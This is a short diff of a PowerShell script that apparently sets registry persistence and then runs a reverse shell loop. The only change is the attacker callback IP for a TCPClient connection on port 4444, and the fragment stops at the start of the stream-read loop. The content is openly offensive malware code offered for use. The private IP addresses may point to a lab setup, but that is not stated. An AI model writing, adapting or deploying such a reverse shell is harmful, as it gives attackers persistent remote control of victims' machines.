@@ -175,7 +175,7 @@ Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
 # --- 2. Reverse Shell Loop ---
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient('192.168.1.10', 4444)
+        $client = New-Object System.Net.Sockets.TCPClient('192.168.56.11', 4444)
         $stream = $client.GetStream()
         [byte[]]$bytes = 0..65535|%{0}
         while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
